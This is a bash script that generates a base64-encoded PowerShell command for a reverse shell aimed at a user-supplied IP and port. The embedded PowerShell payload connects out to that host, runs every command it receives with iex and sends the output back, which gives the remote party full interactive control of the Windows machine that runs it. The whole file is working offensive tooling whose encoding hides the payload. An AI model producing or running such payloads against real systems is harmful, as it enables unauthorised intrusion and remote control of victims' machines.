#!/usr/bin/env bash

### Helpers begin
check_deps() {
    for d in "${deps[@]}"; do
        [[ -n $(command -v "$d") ]] || errx 128 "$d is not installed"
    done; unset d
}
err() { echo -e "${color:+\e[31m}[!] $*\e[0m"; }
errx() { err "${*:2}"; exit "$1"; }
good() { echo -e "${color:+\e[32m}[+] $*\e[0m"; }
info() { echo -e "${color:+\e[37m}[*] $*\e[0m"; }
long_opt() {
    local arg shift="0"
    case "$1" in
        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 127 ;;
        *) shift="1"; shift; [[ $# -gt 0 ]] || usage 127; arg="$1" ;;
    esac
    echo "$arg"
    return $shift
}
subinfo() { echo -e "${color:+\e[36m}[=] $*\e[0m"; }
warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
### Helpers end

usage() {
    cat <<EOF
Usage: ${0##*/} [OPTIONS] <ip>

Output an encoded powershell command for a reverse shell.

Options:
    -h, --help        Display this help message
    --no-color        Disable colorized output
    -p, --port=NUM    Use specified port (default: 4444)

EOF
    exit "$1"
}

declare -a args deps
unset help
color="true"
deps+=("base64")
deps+=("iconv")
port="4444"

# Check for missing dependencies
check_deps

# Parse command line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        "--") shift && args+=("$@") && break ;;
        "-h"|"--help") help="true" ;;
        "--no-color") unset color ;;
        "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
        *) args+=("$1") ;;
    esac
    shift
done
[[ ${#args[@]} -eq 0 ]] || set -- "${args[@]}"

# Check for valid params
[[ -z $help ]] || usage 0
[[ $# -eq 1 ]] || usage 1

ip="$1"

echo -n "powershell -EncodedCommand "
cat <<EOF | iconv -f ASCII -t UTF-16LE | base64 -w 0
\$client = New-Object System.Net.Sockets.TCPClient("$ip", ${port});
\$stream = \$client.GetStream();

\$sendback = "PS " + (pwd).Path + "> ";
\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback);
\$stream.Write(\$sendbyte, 0, \$sendbyte.Length);
\$stream.Flush();

[byte[]]\$bytes = 0..65535|%{0};
while ((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0) {
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String);
    \$sendback2 = \$sendback + "PS " + (pwd).Path + "> ";
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte, 0, \$sendbyte.Length);
    \$stream.Flush();
};
EOF
echo
